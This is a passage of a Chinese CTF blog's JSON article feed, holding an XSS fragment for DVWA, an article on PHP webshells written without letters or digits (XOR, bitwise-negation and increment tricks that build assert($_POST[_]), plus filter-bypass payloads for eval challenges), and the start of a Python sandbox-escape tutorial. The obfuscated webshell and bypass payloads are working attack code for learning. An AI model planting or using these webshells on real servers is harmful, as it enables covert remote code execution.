DVWAreflectedlow&lt;script&gt;alert(1);&lt;/script&gt;medium&lt;scRiPt&gt;alert(1);&lt;/script&gt;high&lt;?phphea","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}]},{"title":"特殊的webshell","slug":"特殊的webshell","date":"2019-09-27T03:26:55.000Z","updated":"2020-05-09T03:59:06.848Z","comments":true,"path":"api/articles/特殊的webshell.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"特殊的webshell\"><a href=\"#特殊的webshell\" class=\"headerlink\" title=\"特殊的webshell\"></a>特殊的webshell</h1><p>实验环境 ：<code>php 5.45+nts+apache</code></p>\n<blockquote>\n<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>\n<p>但 php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>\n</blockquote>\n<h2 id=\"不包含数字字母\"><a href=\"#不包含数字字母\" class=\"headerlink\" title=\"不包含数字字母\"></a>不包含数字字母</h2><pre><code>&lt;?php\n@highlight_file(__FILE__);\nif(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) {\n eval($_GET[&apos;shell&apos;]);\n}\n?&gt;</code></pre><h3 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h3><p>异或是对字符的 <code>ascii</code>码进行逐位异或以后得到一个异或结果<code>ascii</code>码的字符。</p>\n<p>第一种方法就是这样来绕过数字字母的检测。</p>\n<pre><code>$a=urldecode(&apos;%01&apos;); //ascii 0x01\n$b=urldecode(&apos;`&apos;);   //ascii 96\necho $a^$b;             //a\n96:  0110 0000\n%01: 0000 0001         //相当于ascii+1</code></pre><p>我们统一选取  ‘`’  作为我们异或的起点，因为他的 ascii 是96。</p>\n<pre><code>$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);\n$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;\n$___=$$__;\n$_($___[_]); // assert($_POST[_]);</code></pre><p>在如下过滤中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们 <code>POST : _=phpinfo();</code> 即可成功执行</p>\n<h3 id=\"取反\"><a href=\"#取反\" class=\"headerlink\" title=\"取反\"></a>取反</h3><p>通过取反将汉字编码中的编码取出来进行取反</p>\n<pre><code>echo ((&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)).&apos; &apos;;//利用弱类型的特性\n$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);\n$_=$__/$__;\necho $_;\necho ~(&apos;和&apos;{2});              //s</code></pre><p>payload:</p>\n<pre><code>$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)%2b(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);\n$_=$__/$__;\n\n$____=&apos;&apos;;\n$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});\n\n$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});\n\n$_=$$_____;\n$____($_[$__]);</code></pre><p>效果如下：</p>\n<h3 id=\"字符递增\"><a href=\"#字符递增\" class=\"headerlink\" title=\"字符递增\"></a>字符递增</h3><blockquote>\n<p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = ‘Z’; $a++; 将把 $a 变成’AA’，而在 C 中，a = ‘Z’; a++; 将把 a 变成 ‘[‘（’Z’ 的 ASCII 值是 90，’[‘ 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p>\n</blockquote>\n<pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;\n$a = 5;\necho &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\\n&quot;; //5\necho &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\\n&quot;;   //6\n$c = &apos;b&apos;;\necho $c++.&quot;&lt;br /&gt;\\n&quot;;                     //b\necho $c.&quot;\\n&quot;;                               //c\n?&gt;</code></pre><p>我们只要拿到一个变量值为 <code>a</code> ，通过自增操作就可以获得 <code>a-z</code> 中所有字符。</p>\n<p>php中如果强制链接数组和字符串的话，数组会被转换成字符串，值为 <code>Arrary</code> </p>\n<pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>我们取第一个字符就可以得到 <code>A</code> 了。</p>\n<p>payload:</p>\n<pre><code>&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;\n$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&apos;_&apos;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);</code></pre><h2 id=\"限制长度\"><a href=\"#限制长度\" class=\"headerlink\" title=\"限制长度\"></a>限制长度</h2><p>PHP可以将字符串当作函数来处理：</p>\n<pre><code>function B()\n{\n    echo &quot;hello world!&quot;;\n}\n\n$_++;           //1\necho $_;\n$__ = &apos;?&apos;^&apos;}&apos;; //B\necho $__;\n$__();</code></pre><p>题目：</p>\n<pre><code>&lt;?php\ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;40){\n        die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>限制长度为40，之前的异或不行了。我们要利用PHP允许动态执行函数的特点，构造一个 <code>_GET</code> 来去读取 <code>getFlag()</code> </p>\n<p>可以通过连续调用异或来获得 <code>_GET</code> </p>\n<pre><code>&lt;?php\n    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET\n?&gt;</code></pre><p>通过构造 <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> 来获取参数</p>\n<p>最后传入参数 getFlag</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>后面的 <code>__</code> 我们不传值默认为 <code>NULL</code> 也就相当于 <code>getFlag()</code></p>\n<p>事实上下面这也可以：</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>对 <code>getFlag</code> 进行取反然后 <code>URL</code> 编码</p>\n<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>这个在{}中进行取反 <code>${~&quot;\\xa0\\xb8\\xba\\xab&quot;}</code> ，相当于 <code>$_GET</code>，拼接出了 <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>，传入 <code>+=getFlag()</code> 从而执行了函数`</p>\n<h2 id=\"不用数字字母和下划线\"><a href=\"#不用数字字母和下划线\" class=\"headerlink\" title=\"不用数字字母和下划线\"></a>不用数字字母和下划线</h2><p>题目：</p>\n<pre><code>&lt;?php\n\ninclude &apos;flag.php&apos;;\n\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;50){\n        die(&quot;Too Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){\n        die(&quot;Not Allowed.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;  </code></pre><p>通过上面的取反就可以了</p>\n<pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;\n\n$c = &quot;_GET&quot;;\necho urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>这里利用 <code>${}</code> 中的代码可以执行的特点，在 <code>{}</code> 里进行取反操作，其实也就是可变变量</p>\n<pre><code>&lt;?php\n    $a = &apos;hello&apos;;\n    $$a = &apos;world&apos;;\n    echo &quot;$a ${$a}&quot;;\n?&gt;\n\n输出：hello world</code></pre><p>这里的 <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> 相当于 <code>$_GET</code> .</p>\n<p>还有更骚的，用中文：</p>\n<pre><code>code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>相当于直接给变量赋值了，这样就不用 <code>{}</code> 了</p>\n<h2 id=\"不用数字、字母、-、\"><a href=\"#不用数字、字母、-、\" class=\"headerlink\" title=\"不用数字、字母、_、$\"></a>不用数字、字母、_、$</h2><pre><code>&lt;?php \ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;]))\n{\n    $code=$_GET[&apos;code&apos;];\n    if(strlen($code)&gt;35){\n    die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))\n    {\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n//$hint=&quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>\n<p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p>\n<p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p>\n<h2 id=\"another-test\"><a href=\"#another-test\" class=\"headerlink\" title=\"another test\"></a>another test</h2><pre><code>&lt;?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET[&apos;_&apos;];\nif ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $_) )\n    die(&apos;rosé will not do it&apos;);\n\nif ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )\n    die(&apos;you are so close, omg&apos;);\n\neval($_);\n?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p>\n<pre><code>&lt;?php \n$arr = get_defined_functions()[&apos;internal&apos;];\n\nforeach ($arr as $key =&gt; $value) {\n    if ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $value) ){\n        unset($arr[$key]);\n        continue;\n    }\n\n    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){\n        unset($arr[$key]);\n        continue;\n    }\n}\n\nvar_dump($arr);\n?&gt;</code></pre><h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<p><a href=\"https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/\" target=\"_blank\" rel=\"noopener\">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5677#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5677#toc-3</a></p>\n</blockquote>\n","text":"特殊的webshell实验环境 ：php 5.45+nts+apachephp5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。但 php7中，assert不再是函数，变成了一个语言结构（类似eval），","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"python沙盒逃逸:从头开始","slug":"python沙箱逃逸","date":"2019-10-11T06:26:44.000Z","updated":"2019-10-14T12:20:33.712Z","comments":true,"path":"api/articles/python沙箱逃逸.json","excerpt":"","keywords":null,"cover":"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg","content":"<p>10/11/2019 2:26:44 PM </p>\n<h1 id=\"Python-沙箱逃逸你真的看懂了么？\"><a href=\"#Python-沙箱逃逸你真的看懂了么？\" class=\"headerlink\" title=\"Python 沙箱逃逸你真的看懂了么？\"></a>Python 沙箱逃逸你真的看懂了么？</h1><p>python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。</p>\n<p>由于环境中限制了许多敏感模块比如 os 、 sys ，于是我们的重点变成了如何绕过限制去引入能执行我们想要的操作的模块。</p>\n<p>接下来让我们先了解一下 python 的两个非常重要的东西</p>\n<h2 id=\"type-amp-object\"><a href=\"#type-amp-object\" class=\"headerlink\" title=\"type &amp; object\"></a>type &amp; object</h2><p>在 python 里要查看一个类型的父类，使用它的 <strong>base</strong> 属性查看。  在 python 里查看一个实例的类型，使用它的 <strong>class</strong> 属性可以查看，或者使用 type() 函数查看。</p>\n<pre><code>&gt;&gt;&gt; object\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; type\n&lt;type &apos;type&apos;&gt;</code></pre><p>他们都是 type 的一个实例，表示他们都是类型对象。</p>\n<p>Python 中， object 是父子关系的顶端，所有数据类型的父类都是它； type 是类型实例关系的顶端，所有对象都是它的实例，他们的关系可以描述为: object 是一个 type (object is a instance of type)，即 Object 是 type 的一个实例。</p>\n<pre><code>&gt;&gt;&gt; object.__class__\n&lt;type &apos;type&apos;&gt;\n\n&gt;&gt;&gt; object.__bases__  #站在食物链顶端的男人，没有父类\n()\n\n&gt;&gt;&gt; type.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__    #type 的类型是自己\n&lt;type &apos;type&apos;&gt;</code></pre><p>我们再尝试引入一些内置数据类型来看看：</p>\n<pre><code>&gt;&gt;&gt; list.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__\n&lt;type &apos;type&apos;&gt;\n&gt;&gt;&gt; dict.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; dict.__class__\n&lt;type &apos;type&apos;&gt;</code></pre><p><strong>他们的父类都是 object , 类型都是 type</strong>，这点很重要！</p>\n<p>我们把他们放在一个表里看看：</p>\n<p><img src=\"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg\" alt></p>\n<p>白板上的虚线表示源是目标的实例，实线表示源是目标的子类。即，左边的是右边的类型，而上面的是下面的父亲。</p>\n<h2 id=\"builtin、builtins、builtins-是什么？\"><a href=\"#builtin、builtins、builtins-是什么？\" class=\"headerlink\" title=\"builtin、builtins、builtins 是什么？\"></a><strong>builtin</strong>、<strong>builtins</strong>、builtins 是什么？</h2><p>python 中有一个内建模块，该模块中有一些常用函数；而该模块在 Python 启动之后、且没有执行任何代码之前，python 会首先加载该内建函数到内存中。另外，该内建函数中的功能可以直接使用不需要添加任何内建模块前缀，其原因是对函数、变量、类等标识符的查找是按照 LE(N)GB 的规则</p>\n<pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>在 Python2.x 版本中，内建模块被命为 <code>__builtin__</code> , 而到了 Python3.x 版本更名为 <code>builtins</code> .</p>\n<p>当使用内建模块中函数或其它功能时，可以直接使用，不用添加内建模块的名字;但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即 <strong>dict</strong> 字典属性)中添加该功能。在导入时，如果是 Python2.X 版本，就要导入 <code>__builtin__</code> 模块;如果是 Python3.X版本，就要导入builtins 模块。如：在 Python2.X 中，向内建模块添加 一个函数(该函数打印 “hello, world” )，可以这样写</p>\n<pre><code>&gt;&gt;&gt; import __builtin__\n&gt;&gt;&gt; def print_hello():\n...     print &quot;hello world!&quot;\n...\n&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello\n&gt;&gt;&gt; print_hello()\nhello world!\n&gt;&gt;&gt; hello()\nhello world!</code></pre><p>此时， <code>print_hello</code> 和 <code>hello</code> 两个函数名几乎是一样，但是有一点区别，<code>print_hello</code>只能在该模块中使用，而 <code>hello</code> 可以在本程序中的其它任何一个模块中使用，因为 <code>hello</code> 已经放到内建模块中了。</p>\n<p>说完了 <code>__builtin__</code> 和 <code>builtin</code> ,那 <code>__builtins__</code> 是什么？</p>\n<p><code>__builtins__</code> 即是引用，也是在代码运行之前被加载到内存中。但是它们还有一点区别：</p>\n<ol>\n<li>无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入 <code>__builtin__</code> 内建模块;而对于 <code>__builtins__</code> 却不用导入，它在任何模块都直接可见</li>\n<li>在主模块 <code>__main__</code> 中 <code>__builtins__</code> 是对内建模块 <code>__builtin__</code> 本身的引用，即 <code>__builtins__</code> 完全等价于 <code>__builtin__</code> ，二者完全是一个东西，不分彼此；在非主模块中 <code>__builtins__</code> 仅是对 <code>__builtin__</code> . <code>__dict__</code> 的引用，而非<code>__builtin__</code> 本身。它在任何地方都可见。此时 <code>__builtins__</code> 的类型是字典。</li>\n</ol>\n<p>我们打开 IDLE 看看这里面都有什么东西吧(Python 2.7)。</p>\n<pre><code>&gt;&gt;&gt; dir(__builtins__)\n[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>我们看到了常用的 <code>__import__</code> 、 <code>bin</code> 、 <code>eval</code> 等命令</p>\n<p>好了，现在我们已经大致上知道了各个模块之间的关系了！</p>\n<h2 id=\"Python-有哪些可以执行系统命令呢？\"><a href=\"#Python-有哪些可以执行系统命令呢？\" class=\"headerlink\" title=\"Python 有哪些可以执行系统命令呢？\"></a>Python 有哪些可以执行系统命令呢？</h2><p>os  commands  subprocess  timeit  platform  pty …</p>\n<p>搬运一个测试所有导入 os 或者 sys 的库的脚本：</p>\n<pre><code>#-*- coding:utf8 -*-\n# By Macr0phag3\n# in 2019-05-07 19:46:12\n# ------------------------------------\n\n# this, antigravity 库删掉\nall_modules_2 = [\n    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, 